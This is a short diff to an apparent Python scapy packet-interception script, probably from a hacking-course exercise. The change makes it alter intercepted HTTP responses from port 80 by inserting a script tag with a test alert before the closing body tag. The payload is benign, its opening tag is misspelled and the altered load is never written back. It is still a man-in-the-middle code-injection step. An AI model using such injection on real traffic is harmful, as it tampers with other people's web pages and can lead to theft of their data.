@@ -25,8 +25,7 @@ def process_packet(packet):
             print(my_packet.show())
         elif my_packet[scapy.TCP].sport == 80:
             print("[+] Response...")
-            print(my_packet.show())
-
+            modified_load  = my_packet[scapy.Raw].load.replace("</body>", "<scrip>alert('test');</script></body>")
     packet.accept()
 
 
